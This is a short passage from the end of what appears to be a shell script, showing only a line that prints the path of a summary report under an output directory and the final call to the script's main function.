Report: \`${OUTDIR}/reports/summary.md\`"
}

main "$@"
